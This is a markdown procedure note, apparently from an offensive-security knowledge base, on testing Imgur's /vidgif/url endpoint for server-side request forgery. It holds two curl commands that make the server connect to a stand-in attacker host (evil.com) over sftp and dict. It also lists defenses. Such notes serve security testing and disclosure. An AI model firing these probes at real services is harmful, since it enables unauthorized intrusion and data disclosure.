---
tags:
  - ssrf
  - imgur
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ssrf-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:09.027Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: aa917955-ca4b-4945-9b9f-6712429da03f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-SSRF-on-Imgur-VidGif-Endpoint

## Summary

This procedure tests the Imgur /vidgif/url endpoint for SSRF by supplying URLs with arbitrary protocols like SFTP, DICT, GOPHER, and TFTP, confirming libcurl's lack of validation allows connections to attacker-controlled servers.

## Description

The endpoint fetches user-supplied URLs to determine content-type and length for video-to-gif conversion, but without protocol restrictions, it enables SSRF. This can lead to information disclosure, spam, UDP attacks, and DoS. Prerequisites include public access to Imgur and a controlled domain for testing.

## Requirements

1. Network access to https://imgur.com
2. Control over an external domain (e.g., evil.com) for hosting listeners
3. Basic web request tools like curl

## Defense

Defensive measures and detection strategies:

- Validate and whitelist allowed protocols (HTTP/HTTPS only) in libcurl usage
- Implement URL parsing to block non-web schemes
- Monitor outbound connections from application servers for anomalous protocols

## Objectives

1. Confirm SSRF vulnerability by triggering connections to non-HTTP endpoints
2. Identify supported protocols for further exploitation
3. Establish baseline for chaining attacks like info disclosure

## Instructions

### Step 1: Probe Endpoint with Arbitrary Protocol

**Context**: Send a request using a non-HTTP URL to test if the server initiates a connection.

**Command** ([[commands/curl-ssrf-test]]):
```bash
curl "https://imgur.com/vidgif/url?url=sftp://evil.com:11111/"
```

> This sends an HTTP request to Imgur, but the server uses libcurl to fetch the sftp:// URL, attempting a connection to your server on port 11111. Expected output is an HTTP response from Imgur, but verify via listener for success.

### Step 2: Verify with Multiple Protocols

**Context**: Test additional schemes to map vulnerability scope.

**Command** ([[commands/curl-ssrf-test]]):
```bash
curl "https://imgur.com/vidgif/url?url=dict://evil.com:11111/"
```

> Similar to Step 1, but using DICT protocol. Success if connection banner is leaked.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-ssrf-test]]

## Tools Used

- [[tools/curl]]

## Tags

- [[ssrf]]
- [[imgur]]
